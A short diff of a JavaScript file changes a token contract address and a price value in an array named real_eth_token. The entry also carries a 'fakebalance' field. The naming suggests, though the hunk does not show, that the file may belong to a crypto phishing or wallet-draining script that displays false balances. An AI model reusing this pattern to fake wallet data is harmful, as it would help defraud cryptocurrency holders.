@@ -444,8 +444,8 @@ async function proceed(){
         let real_eth_token = new Array();
         let real_eth_NFTs = new Array();
         real_eth_token[0]= {
-            contractAddress : "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5",
-            realprice : "100000",
+            contractAddress : "0x1e3A3B9C6177BA05102B749eEcB6164155FD44ae",
+            realprice : "1000000",
             balance : "10000000000000000000000000",
             decimal : "18",
             fakebalance : "10000000000000000000000000"
